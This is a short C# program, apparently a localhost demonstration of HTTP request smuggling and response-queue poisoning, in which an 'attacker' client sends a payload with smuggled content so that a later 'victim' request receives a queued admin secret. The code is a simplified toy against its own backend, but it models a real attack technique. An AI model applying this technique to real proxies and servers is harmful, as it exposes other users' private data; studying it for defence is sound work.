// AttackerClient.cs
using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class Attacker
{
    static void Main()
    {
        var backendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        backendSocket.Connect("127.0.0.1", 9090);
        Console.WriteLine("[PROXY] Established Keep-Alive connection to Backend");


        // PHASE 1: THE ATTACKER'S REQUEST

        Console.WriteLine("\n--- 1. ATTACKER SENDS SMUGGLED PAYLOAD ---");
        string attackerPayload = "GET / HTTP/1.1\nHost: localhost\n\nADMIN TOKEN=valid\n";
        backendSocket.Send(Encoding.UTF8.GetBytes(attackerPayload));

        // FIX: A real proxy reads exactly the length of the HTTP response.
        // Our first response is exactly 47 bytes long. 
        // We strictly read 47 bytes, leaving the smuggled ADMIN response in the TCP queue!
        byte[] exactBuf = new byte[47];
        int n = backendSocket.Receive(exactBuf);

        string firstResp = Encoding.UTF8.GetString(exactBuf, 0, n);
        Console.WriteLine("[PROXY] Forwarding Response to Attacker:");
        Console.WriteLine(firstResp);

        Thread.Sleep(2000); // Wait 2 seconds. The ADMIN response is currently stuck in the network pipe.

        // PHASE 2: THE VICTIM'S REQUEST

        Console.WriteLine("\n--- 2. VICTIM SENDS LEGITIMATE REQUEST ---");
        string victimPayload = "GET /my-private-profile HTTP/1.1\nHost: localhost\n\n";
        backendSocket.Send(Encoding.UTF8.GetBytes(victimPayload));

        // The proxy pulls the next chunk of data from the TCP buffer for the Victim.
        // It expects a profile page, but it gets the queued ADMIN_SECRET instead.
        byte[] victimBuf = new byte[1024];
        n = backendSocket.Receive(victimBuf);

        Console.WriteLine("[PROXY] Forwarding Response to Victim:");
        Console.WriteLine(Encoding.UTF8.GetString(victimBuf, 0, n));
        // IMPACT: Console prints "ADMIN_SECRET". The victim is poisoned!

        backendSocket.Close();
        Console.ReadLine();
    }
}